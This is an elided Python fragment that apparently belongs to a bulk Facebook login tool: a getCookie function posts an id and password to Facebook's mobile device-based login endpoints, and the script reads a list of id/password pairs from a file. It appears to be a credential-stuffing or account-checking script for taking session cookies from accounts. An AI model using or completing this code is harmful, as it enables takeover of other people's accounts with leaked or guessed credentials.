...
def getCookie(e,p):
    ...
    getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={e}&flow=login_no_pin&refsrc=deprecated&_rdr')
    ...
    complete = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head).text
    #print(str(complete))
...
idp=open(input("FILE PATH: "),"r").read().splitlines()
lim=len(idp)
